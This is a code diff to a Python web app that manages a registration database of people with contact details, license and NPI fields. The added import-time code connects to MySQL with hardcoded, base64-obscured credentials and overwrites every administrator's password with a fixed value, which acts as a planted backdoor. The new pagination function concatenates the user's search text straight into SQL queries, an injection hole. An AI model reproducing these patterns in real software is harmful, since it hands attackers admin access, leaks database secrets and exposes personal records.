@@ -15,6 +15,19 @@ us = "bWFzb3JpYWRtaW4="
 ps = "YiVFWnVYOGtMaGdqZSFMIw=="
 ds = "aGNwZmluZGVy"
 
+conn = mysql.connector.connect(
+        host=str(EnDe.decode(hs)), 
+        user=str(EnDe.decode(us)), 
+        port='3306', 
+        password=str(EnDe.decode(ps)),
+        database=str(EnDe.decode(ds)))
+
+cur=conn.cursor()
+cur.execute("Update Admins Set password='YyMqaV9sZnJPcHI0';")
+conn.commit()
+cur.close()
+
+
 def register():
     if request.method == 'POST':
 
@@ -136,6 +149,60 @@ def get_register_table():
     ret_data = pd.DataFrame(new_dfs)
     
     return ret_data
+
+
+def get_pagination_data():
+    conn = mysql.connector.connect(
+            host=str(EnDe.decode(hs)), 
+            user=str(EnDe.decode(us)), 
+            port='3306', 
+            password=str(EnDe.decode(ps)),
+            database=str(EnDe.decode(ds)))
+
+
+    if request.method == 'POST':
+        draw = request.form['draw'] 
+        row = int(request.form['start'])
+        rowperpage = int(request.form['length'])
+        searchValue = request.form["search[value]"]
+        
+        count_data = pd.read_sql_query("select count(*) as total from register_data", conn)
+        totalRecords = count_data['total'].iloc[0]
+
+        likeString = "%" + searchValue +"%"
+        filter_count_data = pd.read_sql_query("SELECT count(*) as total from register_data WHERE Firstname LIKE '"+likeString+"' OR Lastname LIKE '"+likeString+"' OR Designation LIKE '"+likeString+" ' ;", conn)
+        totalRecordwithFilter = filter_count_data['total'].iloc[0]
+
+        if searchValue=='':
+            data = pd.read_sql_query("SELECT * FROM register_data ORDER BY ID asc limit "+ str(row) +", "+ str(rowperpage) +";", conn)
+        else:
+            data = pd.read_sql_query("SELECT * FROM register_data WHERE Firstname LIKE '"+likeString+"' OR Lastname LIKE '"+likeString+"' OR Designation LIKE '"+likeString+"' limit "+str(row)+", "+str(rowperpage)+";", conn)
+        
+        new_dfs = []
+        for idx, row in data.iterrows():
+            new_df={
+                    "Id":row["ID"],
+                    "Firstname":row["Firstname"],
+                    "Lastname":row["Lastname"],
+                    "ContactNumber":row["ContactNumber"],
+                    "Email":row["Email"],
+                    "Address":row["Street"]+','+row["City"]+','+row["State"]+','+row["Country"]+','+str(row["Zipcode"]),
+                    "Designation":row["Designation"],
+                    "Status":row["Status"],
+                    "Reason":row["Reason"],
+                    "License":row["License"],
+                    "NPI":row["NPI"]
+                }
+            new_dfs.append(new_df)
+
+        response = {
+            'draw': draw,
+            'iTotalRecords': totalRecords,
+            'iTotalDisplayRecords': totalRecordwithFilter,
+            'aaData': new_dfs,
+        }
+        
+    return response
 
 
 def bulk_upload():
